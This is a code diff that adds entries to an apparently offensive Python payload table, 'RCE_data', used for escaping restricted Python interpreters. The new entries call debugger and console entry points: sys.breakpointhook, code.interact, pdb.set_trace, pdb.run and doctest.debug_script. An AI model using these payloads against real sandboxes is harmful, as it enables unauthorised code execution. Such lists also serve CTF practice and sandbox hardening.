@@ -47,6 +47,7 @@ RCE_data = {
             "from uuid import _get_command_stdout as __getattr__;from __main__ import sh",
             "BUILTINS_SET_CHANGED|BUILTINS_SET",
         ],
+        ["sys.breakpointhook()", "sys"],
     ],
     "builtins2RCEinput": [
         [
@@ -98,6 +99,23 @@ RCE_data = {
             "MODULE_BUILTINS",
         ],
         ["sys.breakpointhook()", "sys"],
+        [
+            "code.interact()",
+            "code",
+        ],
+        [
+            "code.InteractiveConsole().interact()",
+            "code",
+        ],
+        [
+            "doctest.debug_script(RANDOMSTRING)",
+            "doctest",
+        ],
+        [
+            "pdb.run(RANDOMSTRING)",
+            "pdb",
+        ],
+        ["pdb.set_trace()", "pdb"],
     ],
     "get_user_defined_function": [["def RANDOMVARNAME():RANDOMSTRING", ""]],
     "get_user_defined_lambda": [["RANDOMVARNAME=lambda:RANDOMSTRING", ""]],
